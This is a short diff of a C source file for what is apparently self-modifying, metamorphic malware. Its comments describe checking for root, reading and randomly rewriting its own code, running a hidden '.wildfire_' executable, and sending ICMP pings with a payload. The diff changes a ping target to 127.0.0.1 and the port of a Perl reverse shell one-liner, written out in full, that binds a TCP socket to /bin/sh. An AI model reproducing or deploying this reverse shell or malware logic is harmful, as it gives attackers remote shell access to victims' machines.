@@ -6,7 +6,6 @@
 #include <dirent.h>
 #include <unistd.h>
 #include <errno.h>
-#include <iconv.h>
 
 #define PUSH 0x50
 #define POP 0x58
@@ -321,7 +320,7 @@ int main(int argc, char* argv[])
     // Outputs 0 if executable is running with root privileges
     int id = system("id -u > /dev/null 2>&1");
     // Sends ICMP ping with custom payload to IP
-    execute("192.168.1.142");                               JUNK;
+    execute("127.0.0.1");                               JUNK;
     // Reads code into memory from currently running executable
     read_code(argv[0]);                                     JUNK;
     // Metamorphically changes the code in a random fashion
@@ -337,6 +336,6 @@ int main(int argc, char* argv[])
     // Execute the original, hidden executable
     execute_bash("./.wildfire_%s", original_executable);    JUNK;
     // Opens a Perl reverse shell with TCP socket
-    execute_bash("perl -e 'use Socket;$i=\"%s\";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", "127.0.0.1");
+    execute_bash("perl -e 'use Socket;$i=\"%s\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'", "127.0.0.1");
     return 0;
 }
